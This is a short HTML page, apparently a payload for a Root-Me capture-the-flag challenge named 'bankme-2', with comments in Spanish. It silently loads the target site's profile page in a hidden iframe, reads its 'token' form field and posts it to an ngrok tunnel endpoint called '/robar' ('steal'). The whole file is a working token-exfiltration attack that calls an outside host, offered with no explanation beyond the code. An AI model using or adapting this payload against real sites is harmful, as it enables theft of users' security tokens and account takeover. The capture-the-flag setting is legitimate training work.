<!DOCTYPE html>
<html>
  <body>
    <iframe id="targetFrame" src="https://bankme-2.challenges.pro.root-me.org/profile" style="display:none;"></iframe>

    <script>
      setTimeout(() => {
        try {
          let iframeDoc = document.getElementById("targetFrame").contentDocument;
          let token = iframeDoc.querySelector('input[name="token"]').value;
          
          fetch("https://48bf-83-213-114-176.ngrok-free.app/robar", {
            method: "POST",
            body: "token=" + encodeURIComponent(token),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
          });
        } catch (e) {
          console.log("Error al acceder al iframe:", e);
        }
      }, 3000); // Espera 3s para que la p√°gina cargue
    </script>
  </body>
</html>
